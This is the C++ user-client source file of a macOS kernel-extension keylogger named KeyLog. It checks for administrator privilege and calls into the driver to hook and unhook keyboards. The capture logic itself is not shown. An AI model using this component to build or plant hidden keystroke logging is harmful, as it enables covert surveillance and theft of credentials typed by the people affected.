//
//  KeyLog_UC.cpp
//  KeyLog
//
//  Created by WangYongChun on 1/9/14.
//
//

#include "KeyLog.h"

#define super IOUserClient

OSDefineMetaClassAndStructors( KeyLogUserClient, IOUserClient );

bool KeyLogUserClient::initWithTask( task_t owningTask,
									 void * securityID,
									 UInt32 type,
									 OSDictionary * properties )
{
	if (clientHasPrivilege(owningTask, kIOClientPrivilegeAdministrator)!=kIOReturnSuccess)
	{
		IOLog( "KeyLogUserClient::Error: unprivileged task attempted to init\n");
		return false;
	}
	
#ifdef DEBUG
	IOLog("KeyLogUserClient::initWithTask(type %u)\n", (unsigned int)type);
#endif
	
	if (!super::initWithTask(owningTask, securityID, type))
        return false;
	
    if (!owningTask)
		return false;
	
    fTask = owningTask;	// remember who instantiated us
	fProvider = NULL;
	
    return true;
}


bool KeyLogUserClient::start( IOService* provider )
{
#ifdef DEBUG
	IOLog( "KeyLogUserClient::start\n" );
#endif
    
    if( !super::start( provider ) )
        return false;
    
    // see if it's the correct class and remember it at the same time
    fProvider = OSDynamicCast( com_prebeg_kext_KeyLog, provider );
    if( !fProvider )
        return false;
	
	fProvider->activate();	// call activate on kext to hook keyboards
	
	return true;
}

void KeyLogUserClient::stop( IOService* provider )
{
#ifdef DEBUG
	IOLog( "KeyLogUserClient::stop\n" );
#endif
	
    super::stop( provider );
}


IOReturn KeyLogUserClient::clientClose( void )
{
#ifdef DEBUG
	IOLog( "KeyLogUserClient::clientClose\n" );
#endif
    
	fProvider->deactivate();	// call deactivate on kext to unhook keyboards
	
    fTask = NULL;
    fProvider = NULL;
    terminate();
    
    return kIOReturnSuccess;
	
}

IOExternalMethod* KeyLogUserClient::getTargetAndMethodForIndex(IOService** targetP, UInt32 index )
{
	*targetP = fProvider;	// driver is target of all our external methods
    
    // validate index and return the appropriate IOExternalMethod
    if( index < kNumlogKextMethods )
        return (IOExternalMethod*) &externalMethods[index];
    else
        return NULL;
}
